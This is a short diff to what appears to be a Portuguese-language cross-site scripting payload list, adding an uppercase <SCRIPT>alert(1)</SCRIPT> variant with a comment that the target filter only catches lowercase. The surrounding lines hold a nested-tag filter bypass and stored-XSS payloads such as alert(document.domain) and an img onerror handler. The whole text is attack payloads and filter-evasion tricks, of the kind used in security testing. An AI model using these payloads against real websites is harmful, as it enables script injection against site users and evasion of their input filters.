@@ -7,6 +7,10 @@
 Aninhado
 <scr<script>ipt>alert(1)</script>
 
+Maiúsculas (porque o filtro só apanha minúsculas):
+
+<SCRIPT>alert(1)</SCRIPT>
+
 # ───── XSS ARMAZENADO (fica guardado) ─────
 <script>alert(document.domain)</script>
 <img src=x onerror=alert(1)>
